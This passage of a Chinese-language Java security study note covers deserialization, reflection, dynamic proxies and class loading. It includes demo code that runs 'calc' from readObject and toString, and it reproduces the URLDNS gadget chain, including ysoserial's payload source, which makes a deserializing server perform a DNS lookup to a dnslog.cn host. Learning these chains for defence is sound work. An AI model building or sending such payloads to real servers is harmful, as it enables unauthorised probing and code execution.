流使用方式上略有不同：\n写法一：\nplain\r1 ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(\u0026#34;ser.bin\u0026#34;)); 传统的基于字节流的文件写入方式：FileOutputStream(\u0026ldquo;ser.bin\u0026rdquo;)， 创建一个 FileOutputStream，表示要写入的目标文件是 ser.bin\n特点：\n简单直接，兼容性很好，Java 早期版本就有。 对路径和文件名使用的是 字符串形式。 写法二：（IDEA推荐）\nplain\r1 ObjectOutputStream oos = new ObjectOutputStream(Files.newOutputStream(Paths.get(\u0026#34;ser.bin\u0026#34;))); **Paths.get(\u0026quot;ser.bin\u0026quot;)**\n使用 java.nio.file.Path 来表示文件路径，比 String 更灵活、可组合。 可以方便地处理跨平台路径，比如 \u0026quot;folder/subfolder/file.txt\u0026quot; **Files.newOutputStream(path)**\n返回一个 OutputStream，功能类似 FileOutputStream。 基于 NIO（New IO）库，提供更多文件操作选项， 特点：\n更现代化的写法，灵活性高，支持 NIO 的各种特性。 更适合与 Path、Files API 配合，比如检查文件是否存在、创建目录等。 java\r1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 import java.io.Serializable; //定义一个 Person 类，并声明它实现了 Serializable 接口,这样 Person 的对象就可以被序列化 public class Person implements Serializable { //私有成员变量 private String name; private int age; //无参构造 public Person() {} //有参构造 public Person(String name, int age) { this.name = name; this.age = age; } //重写 toString() 方法 @Override public String toString() { return \u0026#34;Person{\u0026#34; + \u0026#34;name=\u0026#39;\u0026#34; + name + \u0026#39;\\\u0026#39;\u0026#39; + \u0026#34;, age=\u0026#34; + age + \u0026#39;}\u0026#39;; } } java\r1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 import java.io.IOException; import java.io.ObjectOutputStream; import java.nio.file.Files; import java.nio.file.Paths; public class Serialization { //定义一个静态方法 serialize(Object obj)，接收一个对象并把它序列化到文件 public static void serialize(Object obj) throws IOException { // ObjectOutputStream：包装文件输出流，使其支持写对象 ObjectOutputStream oos = new ObjectOutputStream( // Files.newOutputStream(...)：创建一个输出流，写入到 ser.bin 文件 // Paths.get(\u0026#34;ser.bin\u0026#34;)：得到一个路径对象，表示当前项目目录下的 ser.bin 文件 Files.newOutputStream(Paths.get(\u0026#34;ser.bin\u0026#34;)) ); //oos.writeObject(obj)：把传入的 obj 写到文件里（前提是对象必须实现 Serializable 接口） oos.writeObject(obj); } public static void main(String[] args) throws IOException { Person person = new Person(\u0026#34;aa\u0026#34;, 11); System.out.println(person); //把这个 person 对象写入 ser.bin 文件 serialize(person); } } java\r1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 import java.io.IOException; import java.io.ObjectInputStream; import java.nio.file.Files; import java.nio.file.Paths; public class Unserialize { //定义一个静态方法 unserialize，接收序列化后的二进制文件 public static Object unserialize(String filename) throws IOException, ClassNotFoundException { //new ObjectInputStream(...)：包装成对象输入流，这样可以直接读取对象 ObjectInputStream ois = new ObjectInputStream( // Files.newInputStream(Paths.get(filename))：创建一个输入流，指向 filename 文件 Files.newInputStream(Paths.get(filename)) ); //ois.readObject()：从文件中读取对象 Object obj = ois.readObject(); return obj; } public static void main(String[] args) throws IOException, ClassNotFoundException { //调用 unserialize(\u0026#34;ser.bin\u0026#34;)，从 ser.bin 文件里反序列化得到一个对象，强制转换为 Person 类型 Person person = (Person) unserialize(\u0026#34;ser.bin\u0026#34;); System.out.println(person); } } Serialization 创建 Person 对象并将其序列化保存到文件 ser.bin\n生成的 ser.bin Unserialize 从 ser.bin 文件里恢复（反序列化）一个对象 总的来说：\n在 serialize 方法中，先通过输出流对象 new FileOutputStream(\u0026quot;ser.bin\u0026quot;)【等价于 Files.newOutputStream(Paths.get(\u0026quot;ser.bin\u0026quot;))】创建文件输出通道，然后将输出流包装成 ObjectOutputStream，再调用 writeObject 方法将对象序列化并写入文件。\n在 unserialize 方法中，先通过输入流对象 new FileInputStream(\u0026quot;ser.bin\u0026quot;)【等价于 Files.newInputStream(Paths.get(\u0026quot;ser.bin\u0026quot;))】创建文件输入通道，然后将输入流包装成 ObjectInputStream，再调用 readObject 方法将文件中的二进制数据读取出来并反序列化成对象。\n1.5 为什么会产生安全问题？ 只要服务端反序列化数据，客户端传递类的readObject中代码会自动执行，给予攻击者在服务器上运行代码的能力。\n入口类的\u0026lt;font style=\u0026quot;color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);\u0026quot;\u0026gt;readObject\u0026lt;/font\u0026gt;直接调用危险方法 入口参数中包含可控类，该类有危险方法，readObject 时调用 入口类参数中包含可控类，该类又调用其他有危险方法的类，readObject 时调用 构造函数/静态代码块等类加载时隐式执行 1.5.1 入口类的 readObject 直接调用危险方法 Person 类中写入：\njava\r1 2 3 4 5 6 private void readObject(ObjectInputStream ois) throws IOException, ClassNotFoundException { //调用默认的反序列化过程 ois.defaultReadObject(); //执行了一个系统命令 Runtime.getRuntime().exec(\u0026#34;calc\u0026#34;); } 反序列化时 JVM 会先调用 Person 类中自定义的 readObject 方法，而其中加入了命令执行逻辑，因此对象恢复过程中就触发了计算器的运行。\n依次执行序列化、反序列化，弹出计算器：\n1.5.2 入口参数中包含可控类，该类有危险方法，readObject 时调用 为什么HashMap要自己实现writeObject和readObject方法？\nhttps://juejin.cn/post/6844903954774491144\njava\r1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 import java.io.*; import java.net.URL; import java.util.HashMap; public class Test01 implements Serializable { public static void main(String[] args) throws IOException, ClassNotFoundException { HashMap\u0026lt;URL, Integer\u0026gt; hash = new HashMap\u0026lt;\u0026gt;(); URL u = new URL(\u0026#34;http://w9ge5j.dnslog.cn\u0026#34;); hash.put(u, 1); serializableTest(hash); unserializableTest(\u0026#34;dns.txt\u0026#34;); } // 序列化 public static void serializableTest(Object obj) throws IOException { ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(\u0026#34;dns.txt\u0026#34;)); oos.writeObject(obj); } // 反序列化 public static Object unserializableTest(String filename) throws IOException, ClassNotFoundException { ObjectInputStream ois = new ObjectInputStream(new FileInputStream(filename)); Object o = ois.readObject(); return o; } } URL 类在 JDK 里是自带的类，它的 hashCode() 方法里会触发 DNS 解析\n入口参数里包含了可控的类（URL），而该类在反序列化过程中会自动调用危险方法（hashCode() 触发 DNS 解析），那么在 readObject() 反序列化时就会执行这些危险逻辑，造成安全风险。\nHashMap 找入口类分析： 本例中的代码利用了 HashMap\u0026lt;URL, Integer\u0026gt;，那么看看为什么它会造成漏洞\n跟进 HashMap ，此处继承了 Serializable\n找到重写的 readObject\n跟进 hash\n跟进 hashCode,hashCode 位置处于 Object 类当中\n这样，HashMap 完美满足了可序列化、重写 readObject、接收任意对象作为参数、JDK 自带的入口类条件。\n1.5.3 入口类参数中包含可控类，该类又调用其他有危险方法的类，readObject 时调用 1.5.4 构造函数/静态代码块等类加载时隐式执行 java\r1 2 3 4 5 6 7 8 9 10 public String toString() { try { Runtime.getRuntime().exec(\u0026#34;calc\u0026#34;); } catch (IOException e) { throw new RuntimeException(e); } } //对obj对象进行输出 默认调用原始对象的toString 方法 System.out.println(obj); 在 toString() 中写入危险逻辑，那么只要对象在打印时被隐式调用，就会自动执行恶意代码\n1.6 找漏洞的三个条件 首先一个前提：继承了 Serializable，使对象可序列化\n入口类 source 可序列化 重写 readObject 调用常见函数 接收任意对象作为参数，参数类型宽泛 最后 JDK 自带 调用链 gadget chain 执行类 sink RCE SSRF 写文件等等 2、Java 反射+URLDNS 链 2.1 Java 反射理解 谈谈Java反射：从入门到实践，再到原理\nhttps://juejin.cn/post/6844904025607897096\n反射的作用：让 Java 具有动态性\n2.1.1 静态语言 VS 动态语言 Java 本身使一种静态语言，编译时就决定了类型：\njava\r1 2 //编译器认为 student 的类型是 Student， Student student = new Student(); 而动态语言，比如PHP：\nphp\r1 2 3 \u0026lt;?php $var = \u0026#34;hello\u0026#34;; // 此时 $var 是字符串 $var = 123; // 运行时再赋值，现在 $var 就是整数 再次对比：\n2.1.2 正射与反射 官方对反射的解释\n反射机制使Java代码能够探查已加载类的字段、方法及构造函数信息，并在安全限制范围内，通过反射字段、方法和构造函数对这些底层对应元素进行操作。该 API 既支持需要访问目标对象公共成员（基于其运行时类）的应用程序，也支持访问给定类声明成员的场景，同时允许程序抑制默认的反射访问控制。\n正射（直接调用）：在未运行时（编译时）已经知道了要运行的类 Student\n反射：在运行的时候 forName 从 className=\u0026ldquo;com.demo02.Student\u0026rdquo; 加载 Student 类，再去调用方法\n2.1.3 Class 对象理解 先理解 ：RTTI（Run-Time Type Identification）运行时类型识别\nJava 在运行时识别对象和类的信息主要以俩种方式：一种是 RTTI ，它假定我们在编译期已知道了所有类型；另一种是 反射，在运行时发现和使用类的信息。\n每个类都有一个Class对象，每当编译一个新类就产生一个Class对象（更恰当地说，是被保存在一个同名的.class文件中）。\n比如创建一个Student类，那么，JVM就会创建一个Student对应Class类的Class对象，该Class对象保存了Student类相关的类型信息。\nClass类的对象作用是运行时提供或获得某个对象的类型信息\n2.2 反射使用 2.2.1 反射中极为重要的方法 获取类的方法：forName 实例化类对象的方法：newInstance 获取函数的方法：getMethod 执行函数的方法：invoke 2.2.2 获取 Class 类对象 已知具体的类，通过类的 class 属性获取， java\r1 Class clazz = Person.class; 已知某个类的实例，调用该实例的 **getClass() **方法获取 Class 对象 java\r1 Class clazz = person.getClass(); 已知一个类的全类名，且该类在类路径下，可通过 Class 类的静态方法 forName() 获取，可能抛出 ClassNotFoundException java\r1 Class clazz = Class.forName(\u0026#34;demo01.Student\u0026#34;); java\r1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 package com.kuang.reflection; //测试 class 类的创建方式有哪些 public class Test03 { public static void main(String[] args) throws ClassNotFoundException { Person person = new Student(); System.out.println(\u0026#34;这个人是：\u0026#34;+person.name); //方式一：通过对象获得 Class c1 = person.getClass(); System.out.println(c1.hashCode()); //方式二：foename 获得 Class c2 = Class.forName(\u0026#34;com.kuang.reflection.Student\u0026#34;); System.out.println(c2.hashCode()); //方式三：通过类名 .class 获得 Class c3 = Student.class; System.out.println(c3.hashCode()); //方式四：基本内置类型的包装类都有一个 Type 属性 Class c4 = Integer.TYPE; System.out.println(c4); //获得父类类型 Class c5 = c1.getSuperclass(); System.out.println(c5); } } class Person { String name; public Person() { } public Person(String name) { this.name = name; } @Override public String toString() { return \u0026#34;Person{\u0026#34; + \u0026#34;name=\u0026#39;\u0026#34; + name + \u0026#39;\\\u0026#39;\u0026#39; + \u0026#39;}\u0026#39;; } } class Student extends Person { public Student() { this.name = \u0026#34;student\u0026#34;; } } class Teacher extends Person { public Teacher() { this.name = \u0026#34;Teacher\u0026#34;; } } 2.2.3 实例化/创建对象 因为 Class 类是 private 私有属性，我们也无法通过创建对象的方式来获取 class 对象\n通过 Class 的 **newInstance() **方法 java\r1 2 3 //newInstance 不能传参 Person p1 = (Person) c.newInstance(); System.out.println(p1); 通过 Constructor 的 newInstance() 方法 java\r1 2 3 4 // getConstructor(Class\u0026lt;?\u0026gt;... parameterTypes) Constructor personconstructor = c.getConstructor(String.class, int.class); Person p2 = (Person) personconstructor.newInstance(\u0026#34;asd\u0026#34;, 11); System.out.println(p2); 2.2.3 获取类里面的属性 Filed getField(String name)：指定变量名，可获得 public 类型的属性 getFields()：获得类的 public 类型的属性 getDeclaredField(String name)：指定变量名，可获得所有类型的属性 getDeclaredFields()：获得类的所有类型的属性 java\r1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 //获取类里面的属性 Field[] personfields1 = c.getFields(); for (Field field : personfields1) { System.out.println(field); } System.out.println(\u0026#34;==================================\u0026#34;); Field[] personfields2 = c.getDeclaredFields(); for (Field field : personfields2) { System.out.println(field); } System.out.println(\u0026#34;==================================\u0026#34;); Field idfield = c.getField(\u0026#34;id\u0026#34;); System.out.println(idfield); System.out.println(\u0026#34;==================================\u0026#34;); Field allfield = c.getDeclaredField(\u0026#34;age\u0026#34;); System.out.println(allfield); 2.2.4 获取类的方法 Method getMethod(String name, Class\u0026hellip; parameterTypes)：指定方法名和参数类型，可获得 public 方法（包含父类继承的）。 getMethods()：获得类及父类的所有 public 方法。 getDeclaredMethod(String name, Class\u0026hellip; parameterTypes)：指定方法名和参数类型，可获得本类声明的任意方法（包括 private、protected、默认、public）。 getDeclaredMethods()：获得类中声明的所有方法（不含父类）。 2.2.5 获取类的构造器 Constructor getConstructor(Class\u0026hellip; parameterTypes)：指定参数类型，可获得 public 构造器。 getConstructors()：获得类的所有 public 构造器。 getDeclaredConstructor(Class\u0026hellip; parameterTypes)：指定参数类型，可获得类的任意构造器（包括 private）。 getDeclaredConstructors()：获得类的所有构造器（不论修饰符）。 2.3 URLDNS 链 https://github.com/frohoff/ysoserial/blob/master/src/main/java/ysoserial/payloads/URLDNS.java\nURLDNS 是 ysoserial 中的一个利用链：\nGadget Chain:\nHashMap.readObject() HashMap.putVal() HashMap.hash() URL.hashCode() 分析： 首先是因为 HashMap（java/util/HashMap.java） 中重写了 readObject() 方法，HashMap.readObject() 通过 K key = (K) s.readObject(); 进行反序列化，之后调用 putVal() -\u0026gt; hash()，在 hash() 中调用了 hashCode() ；【关于 HashMap 的分析：HashMap 找入口类分析】\n接下来查看 URL（java/net/URL.java），URL 中继承了 Serializable，\n跟进 hashCode\ngetHostAddress(u) 会尝试把 URL 中的主机名解析成一个 InetAddress 对象（也就是 IP 地址）， 如果主机名解析成功（addr 不为 null），就把解析出来的 IP 地址的 hashCode() 加入到 h（整个 URL 的哈希值）里 ； 如果 DNS 没解析成功（addr == null），那就直接取 URL 原始的 host 字符串\n跟进 getHostAddress，InetAddress.getByName(host)方法会去解析主机名，\n如果 host 是 IP 地址，直接转换成 InetAddress，不会走 DNS 如果 host 是域名，这里就会向系统的 DNS 解析器 发起请求，解析成 IP 完整的利用链：\nHashMap.readObject()\n-\u0026gt; HashMap.putVal()\n-\u0026gt; HashMap.hash()\n-\u0026gt; URL.hashCode()\n-\u0026gt; URLStreamHandler.hashCode()\n-\u0026gt; URLStreamHandler.hashCode.getHostAddress()\n-\u0026gt; getHostAddress.InetAddress.getByName() 【这里发出 DNS 请求】\n复现： java\r1 2 3 HashMap\u0026lt;URL,Integer\u0026gt; hashmap = new HashMap\u0026lt;URL,Integer\u0026gt;(); hashmap.put(new URL(\u0026#34;http://9zuzrq.dnslog.cn\u0026#34;),1); serialize(hashmap); 首先执行序列化，发现触发了dns 请求？\n回到源码中：当 hashCode 不为 -1 时，直接返回 hashCode，不再执行下面代码\n我们知道，第一次将 key（也就是 dnslog）传入 URL.hashCode 时，hashCode == -1（-1 表示没有计算过），执行 hashCode = handler.hashCode(this); ，而根据之前的分析， handler.hashCode -\u0026gt; getHostAddress -\u0026gt; InetAddress.getByName(host) -\u0026gt; 发起dns请求，所以说，序列化本身没有发起 dns请求，是因为 HashMap 在序列化过程中调用了 URL.hashCode() ，URL.hashCode() 解析主机名发起 DNS 请求。\n那么如何不在第一次发起请求？\njava\r1 2 3 4 5 6 7 8 9 10 11 12 13 14 HashMap\u0026lt;URL,Integer\u0026gt; hashmap = new HashMap\u0026lt;URL,Integer\u0026gt;(); //这里不使用 put URL url = new URL(\u0026#34;http://yjgubh.dnslog.cn\u0026#34;); Class c = url.getClass(); Field hashcodefield = c.getDeclaredField(\u0026#34;hashCode\u0026#34;); hashcodefield.setAccessible(true); //人为修改 URL.hashCode 缓存值， hashcodefield.set(url,12134); //由于 hashCode != -1，它直接返回 12134，不会触发 DNS，只是把 URL 当 key 存进去 //存进去之后：此时 HashMap 内部只记录：key = URL(\u0026#34;http://xx.dnslog.cn\u0026#34;);key 的 hash 值 = 12134;value = 1 hashmap.put(url,1); //反序列化之前把 hashcode 改回 -1,恢复 URL.hashCode 的默认状态,下一次调用 url.hashCode() 时，会重新计算并触发 DNS 解析 hashcodefield.set(url,-1); serialize(hashmap); 序列化的过程就不会 DNS 解析：\n只有反序列化的时候触发 DNS 解析：\n学习 ysoserial 中的 URLDNS： java\r1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 @SuppressWarnings({ \u0026#34;rawtypes\u0026#34;, \u0026#34;unchecked\u0026#34; }) @PayloadTest(skip = \u0026#34;true\u0026#34;) @Dependencies() @Authors({ Authors.GEBL }) public class URLDNS implements ObjectPayload\u0026lt;Object\u0026gt; { public Object getObject(final String url) throws Exception { //避免提前解析 //Avoid DNS resolution during payload creation //Since the field \u0026lt;code\u0026gt;java.net.URL.handler\u0026lt;/code\u0026gt; is transient, it will not be part of the serialized payload. URLStreamHandler handler = new SilentURLStreamHandler(); //创建 HashMap + URL HashMap ht = new HashMap(); // HashMap that will contain the URL URL u = new URL(null, url, handler); // URL to use as the Key ht.put(u, url); //The value can be anything that is Serializable, URL as the key is what triggers the DNS lookup. //重置 URL 的缓存 hashCode Reflections.setFieldValue(u, \u0026#34;hashCode\u0026#34;, -1); // During the put above, the URL\u0026#39;s hashCode is calculated and cached. This resets that so the next time hashCode is called a DNS lookup will be triggered. return ht; } public static void main(final String[] args) throws Exception { PayloadRunner.run(URLDNS.class, args); } /** * \u0026lt;p\u0026gt;This instance of URLStreamHandler is used to avoid any DNS resolution while creating the URL instance. * DNS resolution is used for vulnerability detection. It is important not to probe the given URL prior * using the serialized object.\u0026lt;/p\u0026gt; * * \u0026lt;b\u0026gt;Potential false negative:\u0026lt;/b\u0026gt; * \u0026lt;p\u0026gt;If the DNS name is resolved first from the tester computer, the targeted server might get a cache hit on the * second resolution.\u0026lt;/p\u0026gt; */ static class SilentURLStreamHandler extends URLStreamHandler { protected URLConnection openConnection(URL u) throws IOException { return null; } protected synchronized InetAddress getHostAddress(URL u) { return null; } } } ysoserial 为了避免第一次序列化时就发起 DNS 请求，它使用了 SilentURLStreamHandler() 内部类自定义了 handler ，覆盖原来的 URL.hashCode.handler，当第一次请求时，进入 SilentURLStreamHandler.getHostAddress 和 SilentURLStreamHandler.openConnection ，都返回 null ，避免 DNS 请求和访问网络。这样在创建 payload 的阶段就不会触发 DNS ，而反序列化时，hashCode == -1，触发原本的 getHostAddress 触发 DNS 请求。\n2.4 利用 Runtime java\r1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 package com.demo01; import java.lang.reflect.InvocationTargetException; import java.lang.reflect.Method; public class Runtime { public static void main(String[] args) throws ClassNotFoundException, NoSuchMethodException, InvocationTargetException, IllegalAccessException { // 1. 获取 Runtime 类 Class\u0026lt;?\u0026gt; runtimeClass = Class.forName(\u0026#34;java.lang.Runtime\u0026#34;); // 2. 获取 getRuntime() 方法 Method getRuntimeMethod = runtimeClass.getMethod(\u0026#34;getRuntime\u0026#34;); // 3. 调用 getRuntime() 获取 Runtime 对象 Object runtimeInstance = getRuntimeMethod.invoke(null); // 4. 获取 exec(String) 方法 Method execMethod = runtimeClass.getMethod(\u0026#34;exec\u0026#34;, String.class); // 5. 调用 exec() 执行 calc.exe execMethod.invoke(runtimeInstance, \u0026#34;calc.exe\u0026#34;); } } 3、JDK 动态代理 参考文章：\n代理模式(狂神)\n设计模式（四）——搞懂什么是代理模式https://zhuanlan.zhihu.com/p/72644638\n代理模式即 SpringAOP 的底层\n代理模式分为静态代理和动态代理\n原型：\n3.1 静态代理 角色分析：\n抽象角色 ： 一般会使用接口或者抽象类来解决 真实角色 ：被代理角色 代理角色 ：代理真实角色， 客户 ：访问代理对象的人 代理模式的好处：\n可以使真实角色的操作更加纯粹，不用关注一些公共的业务 公共也交给代理角色，实现了业务的分工 公共业务发生扩展的时候，方便集中管理 缺点：\n一个真实角色就会产生一个代理角色，代码量翻倍，开发效率会变低 java\r1 2 3 4 5 6 7 8 package com.kuang.demo01; //租房 public interface Rent { public void rent(); } java\r1 2 3 4 5 6 7 8 9 10 package com.kuang.demo01; //房东 public class Host implements Rent{ @Override public void rent() { System.out.println(\u0026#34;房东要出租房子\u0026#34;); } } java\r1 2 3 4 5 6 7 8 9 10 11 12 13 package com.kuang.demo01; public class Client { public static void main(String[] args) { //房东要租房子 Host host = new Host(); //代理，中介帮房东租房子，但是代理会有一些附属操作 Proxy proxy = new Proxy(host); //你不用面对房东，直接找中介租房子 proxy.rent(); } } java\r1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 package com.kuang.demo01; public class Proxy implements Rent{ private Host host; public Proxy() { } public Proxy(Host host) { this.host = host; } @Override public void rent() { host.rent(); seeHouse(); fare(); hetong(); } //看房 public void seeHouse() { System.out.println(\u0026#34;中介带你看房\u0026#34;); } //收中介费 public void fare() { System.out.println(\u0026#34;中介收取中介费\u0026#34;); } //签租赁合同 public void hetong() { System.out.println(\u0026#34;中介签租赁合同\u0026#34;); } } 另一例:\njava\r1 2 3 4 5 6 7 8 package com.kuang.demo02; public interface UserService { public void add(); public void delete(); public void update(); public void query(); } java\r1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 package com.kuang.demo02; //真实对象 public class UserServiceImpl implements UserService { @Override public void add() { System.out.println(\u0026#34;增加了一个用户\u0026#34;); } @Override public void delete() { System.out.println(\u0026#34;删除了一个用户\u0026#34;); } @Override public void update() { System.out.println(\u0026#34;修改了一个用户\u0026#34;); } @Override public void query() { System.out.println(\u0026#34;查询了一个用户\u0026#34;); } } java\r1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 package com.kuang.demo02; public class UserServiceProxy implements UserService { private UserServiceImpl userService; public void setUserService(UserServiceImpl userService) { this.userService = userService; } @Override public void add() { log(\u0026#34;add\u0026#34;); userService.add(); } @Override public void delete() { log(\u0026#34;delete\u0026#34;); userService.delete(); } @Override public void update() { log(\u0026#34;update\u0026#34;); userService.update(); } @Override public void query() { log(\u0026#34;query\u0026#34;); userService.query(); } //日志方法 public void log(String msg) { System.out.println(\u0026#34;[Debug] 使用了\u0026#34;+msg+\u0026#34;方法\u0026#34;); } } java\r1 2 3 4 5 6 7 8 9 10 11 12 package com.kuang.demo02; public class Client { public static void main(String[] args) { UserServiceImpl userService = new UserServiceImpl(); //代理类 UserServiceProxy proxy = new UserServiceProxy(); //使用代理类实现日志功能！ proxy.setUserService(userService); proxy.add(); } } 在不改变原来的代码的情况下，实现了对原有功能的增强，这是AOP中最核心的思想\n3.2 动态代理 动态代理和静态代理角色一样 动态代理的代理类是动态生成的，不是我们直接写好的 动态代理分为俩大类：基于接口的动态代理，基于类的动态代理 基于接口\u0026ndash;JDK 动态代理 基于类\u0026ndash;cglib java 字节码实现：javasist 了解俩个类：\nProxy：代理 InvocationHandler：调用处理程序 动态代理的好处\n静态代理有的它都有，静态代理没有的，它也有！\n可以使得我们的真实角色更加纯粹 . 不再去关注一些公共的事情 . 公共的业务由代理来完成 . 实现了业务的分工 , 公共业务发生扩展时变得更加集中和方便 . 一个动态代理 , 一般代理某一类业务 一个动态代理可以代理多个类，代理的是接口！ 案例一\njava\r1 2 3 4 5 6 7 8 9 package com.kuang.demo03; //房东 public class Host implements Rent { @Override public void rent() { System.out.println(\u0026#34;房东要出租房子\u0026#34;); } } java\r1 2 3 4 5 6 package com.kuang.demo03; //租房 public interface Rent { public void rent(); } java\r1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 package com.kuang.demo03; import java.lang.reflect.InvocationHandler; import java.lang.reflect.Method; import java.lang.reflect.Proxy; //使用此类自动生成代理类 public class ProxyInvocationHangler implements InvocationHandler { //被代理的接口 private Rent rent; public void setRent(Rent rent) { this.rent = rent; } //生成得到代理类 public Object getProxy() { return Proxy.newProxyInstance(this.getClass().getClassLoader(), rent.getClass().getInterfaces(), this); } //处理代理实例，并返回结果 @Override public Object invoke(Object proxy, Method method, Object[] args) throws Throwable { //动态代理的本质，就是使用反射机制实现 seeHouse(); Object result = method.invoke(rent, args); //return method.invoke(rent, args); fare(); return result; } public void seeHouse() { System.out.println(\u0026#34;中介带看房子\u0026#34;); } public void fare() { System.out.println(\u0026#34;收中介费\u0026#34;); } } java\r1 2 3 4 5 6 7 8 9 10 11 12 13 14 package com.kuang.demo03; public class Client { public static void main(String[] args) { //真实角色 Host host = new Host(); //代理角色，现在没有 ProxyInvocationHangler pih = new ProxyInvocationHangler(); //通过调用程序处理角色来处理我们要调用的接口对象 pih.setRent(host); Rent proxy = (Rent) pih.getProxy(); proxy.rent(); } } 案例二：\njava\r1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 package com.kuang.demo04; import java.lang.reflect.InvocationHandler; import java.lang.reflect.Method; import java.lang.reflect.Proxy; //使用此类自动生成代理类 public class ProxyInvocationHangler implements InvocationHandler { //被代理的接口 private Object target; public void setTarget(Object target) { this.target = target; } //生成得到代理类 public Object getProxy() { return Proxy.newProxyInstance(this.getClass().getClassLoader(), target.getClass().getInterfaces(), this); } //处理代理实例，并返回结果 @Override public Object invoke(Object proxy, Method method, Object[] args) throws Throwable { log(method.getName()); //动态代理的本质，就是使用反射机制实现 return method.invoke(target, args); } public void log(String msg) { System.out.println(\u0026#34;执行了\u0026#34;+msg+\u0026#34;方法\u0026#34;); } } java\r1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 package com.kuang.demo04; import com.kuang.demo02.UserService; import com.kuang.demo02.UserServiceImpl; public class Client { public static void main(String[] args) { //真实角色 UserServiceImpl userService = new UserServiceImpl(); //代理角色，现在没有p ProxyInvocationHangler pih = new ProxyInvocationHangler(); //设置代理对象 pih.setTarget(userService); //动态生成代理类 UserService proxy = (UserService) pih.getProxy(); proxy.add(); // proxy.delete(); // proxy.update(); } } 4、类的动态加载 Java类加载机制和对象创建过程\nhttps://segmentfault.com/a/1190000023876273\n类加载过程详解\nhttps://javaguide.cn/java/jvm/class-loading-process.html\n类加载过程： **加载：**将类的 class 文件字节码加载到内存，并将静态数据转化为方法区的运行时数据结构，然后生成一个 java.lang.Class 对象 **链接：**将java类二进制数据合并到 JRE中 **验证：**确保加载的类信息符合JVM规范，没有安全方面的问题 **准备：**正式为类变量 （static） 分配内存并设置类变量默认初始值的阶段（所以说static在初始化之前就已经有了一个值），这些内存都将在方法区中进行分配 **解析：**虚拟机将常量池内的符号引用替换为直接引用的过程 **初始化：**执行初始化方法 \u0026lt;clinit\u0026gt; ()方法的过程，是类加载的最后一步，这一步 JVM 才开始真正执行类中定义的 Java 程序代码(字节码)。\u0026lt;clinit\u0026gt; ()方法会将该类的静态变量合并。 java\r1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 package com.kuang.reflection; public class Test05 { public static void main(String[] args) { A a = new A(); System.out.println(A.m); /* 1、加载到内存，会在堆产生一个类对应的 Class 对象 2、链接，链接结束后 m=0 3、初始化 \u0026lt;clinit\u0026gt;(){ System.out.println(\u0026#34;A类静态代码块初始化\u0026#34;); m = 300; m = 100; } m = 100 */ } } class A{ static { System.out.println(\u0026#34;A类静态代码块初始化\u0026#34;); m = 300; } static int m = 100; public A() { System.out.println(\u0026#34;A类的无参构造初始化\u0026#34;); } } 类加载器： java\r1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 ppackage com.kuang.reflection; public class Test07 { public static void main(String[] args) throws ClassNotFoundException { //获取系统类的加载器 ClassLoader systemClassLoader=ClassLoader.getSystemClassLoader(); System.out.println(systemClassLoader); //获取系统类的加载器的父类加载器-\u0026gt;扩展类加载器 ClassLoader parent = systemClassLoader.getParent(); System.out.println(parent); //获取扩展类加载器的父类加载器--\u0026gt;根加载器（c/c++） ClassLoader parent1 = parent.getParent(); System.out.println(parent1); //测试当前类是哪个类加载器加载的 ClassLoader classLoader = Class.forName(\u0026#34;com.kuang.reflection.Test07\u0026#34;).getClassLoader(); System.out.println(classLoader); //测试 jdk 内部的类是谁加载的 classLoader=Class.forName(\u0026#34;java.lang.Object\u0026#34;).getClassLoader(); System.out.println(classLoader); //获得系统类加载器可以加载的路径 System.out.println(System.getProperty(\u0026#34;java.class.path\u0026#34;)); /* D:\\Java\\jdk1.8\\jre\\lib\\charsets.jar; D:\\Java\\jdk1.8\\jre\\lib\\deploy.jar; D:\\Java\\jdk1.8\\jre\\lib\\ext\\access-bridge-64.jar; D:\\Java\\jdk1.8\\jre\\lib\\ext\\cldrdata.jar; D:\\Java\\jdk1.8\\jre\\lib\\ext\\dnsns.jar; D:\\Java\\jdk1.8\\jre\\lib\\ext\\jaccess.jar; D:\\Java\\jdk1.8\\jre\\lib\\ext\\jfxrt.jar; D:\\Java\\jdk1.8\\jre\\lib\\ext\\localedata.jar; D:\\Java\\jdk1.8\\jre\\lib\\ext\\nashorn.jar; D:\\Java\\jdk1.8\\jre\\lib\\ext\\sunec.jar; D:\\Java\\jdk1.8\\jre\\lib\\ext\\sunjce_provider.jar; D:\\Java\\jdk1.8\\jre\\lib\\ext\\sunmscapi.jar; 